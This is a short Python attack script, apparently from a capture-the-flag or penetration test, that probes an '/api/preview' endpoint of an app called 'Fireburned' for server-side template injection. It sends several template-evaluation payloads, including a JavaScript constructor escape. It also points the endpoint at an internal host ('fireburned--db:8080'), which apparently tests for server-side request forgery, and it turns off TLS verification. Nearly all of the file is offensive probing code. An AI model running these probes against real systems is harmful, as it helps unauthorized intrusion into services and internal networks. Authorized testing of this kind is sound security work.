#!/usr/bin/env python3
"""Fireburned - pruebas de render/SSTI en /api/preview."""
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://<host>/fireburned"
H = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}


def post(path, payload, tries=25):
    for _ in range(tries):
        try:
            r = requests.post(BASE + path, data=json.dumps(payload),
                              headers=H, timeout=15, verify=False)
            if r.status_code in (502, 503, 504):
                time.sleep(0.3)
                continue
            return r
        except Exception:
            time.sleep(0.3)
    return None


if __name__ == "__main__":
    url = "http://fireburned--db:8080/health"
    templates = [
        "Hello {{7*7}}",
        "<%= 7*7 %>",
        "${7*7}",
        "#{7*7}",
        "{{7*7}}",
        "plain text",
        "{{constructor.constructor('return 7*7')()}}",
    ]
    for t in templates:
        r = post("/api/preview", {"url": url, "method": "GET", "template": t})
        print(f"template={t!r:50} -> {None if r is None else (r.status_code, r.text[:300])}", flush=True)
        r = post("/api/preview", {"url": url, "method": "GET",
                                  "fields": {"template": {"stringValue": t}}})
        print(f"  fields  -> {None if r is None else (r.status_code, r.text[:300])}", flush=True)
